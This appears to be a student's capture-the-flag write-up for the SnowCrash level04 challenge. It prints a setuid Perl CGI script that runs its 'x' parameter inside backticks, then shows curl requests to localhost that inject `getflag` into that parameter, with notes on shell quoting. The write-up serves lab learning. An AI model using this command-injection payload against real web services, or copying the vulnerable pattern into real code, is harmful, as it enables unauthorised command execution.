# LEVELXX

## 1. Inspect the file

```bash
ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```



## 2. Analyze the file

```bash
cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```


## 3.a Exploit the file

```bash
level04@SnowCrash:~$ curl 'http://localhost:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : XXX
```

Make a curl call to the perl file.
The exploit is based on the \`, is it considerate as "executable sign" in perl.
When the `level04.pl` receive the \` it's intepretate it and run the getflag command with the the wright of flag04.

**Explanation:**
- `curl` 				: 
- `http://`				: 
- `localhost`		: 
- `4747`	:
- `level04.pl`	: can be dismiss
- `?x`	: 

## 3.b Exploit the file

```bash
level04@SnowCrash:~$ curl http://localhost:4747/level04.pl?x=\`getflag\`
Check flag.Here is your token : XXX
```

## 3.c As your information

```bash
level04@SnowCrash:~$ curl http://localhost:4747/level04.pl?x=`getflag`
Check
curl: (6) Couldn't resolve host 'flag.Here'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'your'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host ''
curl: (6) Couldn't resolve host 'Nope'
curl: (6) Couldn't resolve host 'there'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'no'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host 'here'
curl: (6) Couldn't resolve host 'for'
curl: (6) Couldn't resolve host 'you'
curl: (6) Couldn't resolve host 'sorry.'
curl: (6) Couldn't resolve host 'Try'
curl: (6) Couldn't resolve host 'again'
curl: (6) Couldn't resolve host ''
```

The \`getflag\` has to be arounded by \\ (\\\`getflag\\\`) or by '' ('\`getflag\`' or 'http://localhost:4747/level04.pl?x=`getflag`') for the hijack to works. The curl has to receive the \`.
The \` is considerate as "executable sign". But if it's not surounded by something, it's the computer that will interprate before the `curl` call. So the curl will receive the result of `getflag` with the actual user.  